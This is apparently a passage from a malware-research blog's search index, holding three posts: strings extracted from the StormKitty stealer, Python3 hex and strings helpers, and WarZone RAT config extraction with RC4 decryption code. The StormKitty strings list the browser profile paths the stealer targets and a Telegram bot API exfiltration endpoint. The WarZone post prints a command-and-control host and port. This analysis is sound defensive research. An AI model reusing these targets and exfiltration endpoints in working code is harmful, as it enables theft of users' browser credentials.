User Data &#39; b&#39; Google(x86) Chrome User Data &#39; b&#39; Opera Software &#39; b&#39; MapleStudio ChromePlus User Data &#39; b&#39; Iridium User Data &#39; b&#39; 7Star 7Star User Data &#39; b&#39; CentBrowser User Data &#39; b&#39; Chedot User Data &#39; b&#39; Vivaldi User Data &#39; b&#39; Kometa User Data &#39; b&#39; Elements Browser User Data &#39; b&#39; Epic Privacy Browser User Data&#39; b&#39; uCozMedia Uran User Data &#39; b&#39; Fenrir Inc Sleipnir5 setting modules ChromiumViewer &#39; b&#39; CatalinaGroup Citrio User Data &#39; b&#39; Coowon Coowon User Data &#39; b&#39; liebao User Data &#39; b&#39; QIP Surf User Data &#39; b&#39; Orbitum User Data &#39; b&#39; Comodo Dragon User Data &#39; b&#39; Amigo User User Data &#39; b&#39; Torch User Data &#39; b&#39; Yandex YandexBrowser User Data &#39; b&#39; Comodo User Data &#39; b&#39; 360Browser Browser User Data &#39; b&#39; Maxthon3 User Data &#39; b&#39; K-Melon User Data &#39; b&#39; Sputnik Sputnik User Data &#39; b&#39; Nichrome User Data &#39; b&#39; CocCoc Browser User Data &#39; b&#39; Uran User Data &#39; b&#39; Chromodo User Data &#39; b&#39; Mail.Ru Atom User Data &#39; b&#39; BraveSoftware Brave-Browser User Data &#39; b&#39; Mozilla Firefox&#39; b&#39; Waterfox&#39; b&#39; K-Meleon&#39; b&#39; Thunderbird&#39; b&#39; Comodo IceDragon&#39; b&#39; 8pecxstudios Cyberfox&#39; b&#39; NETGATE Technologies BlackHaw&#39; b&#39; Moonchild Productions Pale Moon&#39; b&#39; Microsoft Edge User Data&#39; b&#39;https://studio.youtube.com/getAccountSwitcherEndpoint&#39; b&#39;https://www.youtube.com&#39; b&#39;https://studio.youtube.com&#39; b&#39;https://studio.youtube.com/youtubei/v1/att/get?alt=json&amp;key=&#39; b&#39;https://studio.youtube.com/youtubei/v1/att/esr?alt=json&amp;key=&#39; b&#39;vm7UdYrfFAJ7GRZxN8S9&#39; b&#39;http://api64.ipify.org&#39; b&#39;https://api.mylnikov.org/geolocation/wifi?v=1.1&amp;bssid=&#39; b&#39;https://www.google.com.ua/maps/place/&#39; b&#39;https://api.telegram.org/bot&#39; .",
            "url": "https://research.openanalysis.net/dot%20net/static%20analysis/stormkitty/dnlib/python/research/2021/07/14/dot_net_static_analysis.html",
            "relUrl": "/dot%20net/static%20analysis/stormkitty/dnlib/python/research/2021/07/14/dot_net_static_analysis.html",
            "date": " • Jul 14, 2021"
        }
        
    
  
    
        ,"post17": {
            "title": "Python3 Tips and Sample Code",
            "content": "Overview . Python2.7 is like second nature to me now and I keep getting hung up on the idiotic typing that Python3 has introduced. Hopefully these examples will help. . Binary Data and Hex Ecoding . import binascii string_example = &quot;test&quot; byte_array_example = b&quot;test&quot; # Convert string into bytes print(string_example.encode(&#39;utf-8&#39;)) # Convert byte array into string print(byte_array_example.decode(&#39;utf-8&#39;)) # Convert string into hex encoded byte array print(binascii.hexlify(string_example.encode(&#39;utf-8&#39;))) # Convert byte array into hex encoded byte array print(binascii.hexlify(byte_array_example)) # Convert byte array into hex encoded string print(binascii.hexlify(byte_array_example).decode(&#39;utf-8&#39;)) # Convert hex encoded byte array into ascii byte array hex_byte_array = b&#39;74657374&#39; print(binascii.unhexlify(hex_byte_array)) # Convert hex encoded string into ascii byte array hex_string = &#39;74657374&#39; print(binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;))) # Convert hex encoded string into ascii string hex_string = &#39;74657374&#39; print(binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)).decode(&#39;utf-8&#39;)) . b&#39;test&#39; test b&#39;74657374&#39; b&#39;74657374&#39; 74657374 b&#39;test&#39; b&#39;test&#39; test . Hex Encoding Helper Functions . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . Strings Functions . def unicode_strings(buf, n=4): import re ASCII_BYTE = b&#39; ! &quot;# $%&amp; &#39; ( ) * +,- ./0123456789:;&lt;=&gt; ?@ABCDEFGHIJKLMNOPQRSTUVWXYZ [ ] ^_`abcdefghijklmnopqrstuvwxyz { | } ~ t&#39; if type(buf) == str: buf = buf.encode(&#39;utf-8&#39;) reg = b&#39;((?:[%s] x00){%d,})&#39; % (ASCII_BYTE, n) uni_re = re.compile(reg) out = [] for match in uni_re.finditer(buf): try: out.append(match.group().decode(&quot;utf-16&quot;)) except UnicodeDecodeError: pass return out def ascii_strings(buf, n=4): import re ASCII_BYTE = b&#39; ! &quot;# $%&amp; &#39; ( ) * +,- ./0123456789:;&lt;=&gt; ?@ABCDEFGHIJKLMNOPQRSTUVWXYZ [ ] ^_`abcdefghijklmnopqrstuvwxyz { | } ~ t&#39; if type(buf) == str: buf = buf.encode(&#39;utf-8&#39;) reg = b&#39;([%s]{%d,})&#39; % (ASCII_BYTE, n) ascii_re = re.compile(reg) out = [] for match in ascii_re.finditer(buf): try: out.append(match.group().decode(&quot;ascii&quot;)) except UnicodeDecodeError: pass return out . test_var = &quot;test&quot; print(test_var) . test .",
            "url": "https://research.openanalysis.net/python/python3/tips/research/2021/06/27/python3_examples.html",
            "relUrl": "/python/python3/tips/research/2021/06/27/python3_examples.html",
            "date": " • Jun 27, 2021"
        }
        
    
  
    
        ,"post18": {
            "title": "WarZone RAT",
            "content": "Overview . The config is stored in the .bss PE section with the following format. . Key length | key | data . import argparse import struct import pefile import re import binascii . Now a quick reminder ddof binary data hex encoding for Python3 . RC4 Encryption . The data is encrypted using RC4. For more information on RC4 check out our RC4 tutorial video. . def rc4crypt(data, key): #If the input is a string convert to byte arrays if type(data) == str: data = data.encode(&#39;utf-8&#39;) if type(key) == str: key = key.encode(&#39;utf-8&#39;) x = 0 box = list(range(256)) for i in range(256): x = (x + box[i] + key[i % len(key)]) % 256 box[i], box[x] = box[x], box[i] x = 0 y = 0 out = [] for c in data: x = (x + 1) % 256 y = (y + box[x]) % 256 box[x], box[y] = box[y], box[x] out.append(c ^ box[(box[x] + box[y]) % 256]) return bytes(out) . Helper functions . import binascii data = binascii.unhexlify(b&#39;&#39;) key = binascii.unhexlify(b&#39;&#39;) def unicode_strings(buf, n=4): import re ASCII_BYTE = b&#39; ! &quot;# $%&amp; &#39; ( ) * +,- ./0123456789:;&lt;=&gt; ?@ABCDEFGHIJKLMNOPQRSTUVWXYZ [ ] ^_`abcdefghijklmnopqrstuvwxyz { | } ~ t&#39; if type(buf) == str: buf = buf.encode(&#39;utf-8&#39;) reg = b&#39;((?:[%s] x00){%d,})&#39; % (ASCII_BYTE, n) uni_re = re.compile(reg) out = [] for match in uni_re.finditer(buf): try: out.append(match.group().decode(&quot;utf-16&quot;)) except UnicodeDecodeError: continue return out def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . import pefile import struct warzone_file = b&#39;/tmp/work/warzone.bin&#39; data = open(warzone_file, &#39;rb&#39;).read() pe = pefile.PE(data=data) section_data = None for s in pe.sections: if s.Name == b&#39;.bss x00 x00 x00 x00&#39;: section_data = s.get_data() ## size (DWORD) | key | data key_size = struct.unpack(&#39;&lt;I&#39;, section_data[:4])[0] key = section_data[4:4 + key_size] ctxt = section_data[4+key_size:] ctxt = ctxt.split(b&#39; x00 x00 x00 x00 x00 x00 x00 x00&#39;)[0] ptxt = rc4crypt(ctxt, key) host_len = struct.unpack(&#39;&lt;I&#39;, ptxt[:4])[0] host_wide = ptxt[4:host_len+4] c2_host = unicode_strings(host_wide)[0] c2_port = struct.unpack(&#39;&lt;H&#39;, ptxt[host_len+4:host_len+4+2])[0] print(&quot;host: %s, port: %d&quot; % (c2_host, c2_port)) . host: 165.22.5.66, port: 1111 .",
            "url": "https://research.openanalysis.net/warzone/malware/config/2021/05/31/warzone_rat_config.html",
            "relUrl": "/warzone/malware/config/2021/05/31/warzone_rat_config.html",
            "date": " • May 31, 2021"
        }
        
    
  

  
  

  

  
  

  

  
  

  

  
  

  
  

  

  
  

  
      ,"page10": {
          "title": "",
          "content": "Sitemap: {{ “sitemap.xml” | absolute_url }} | .",
          "url": "https://research.openanalysis.net/robots.txt",
          "relUrl": "/robots.txt",
          "date": ""
      }
      
  

}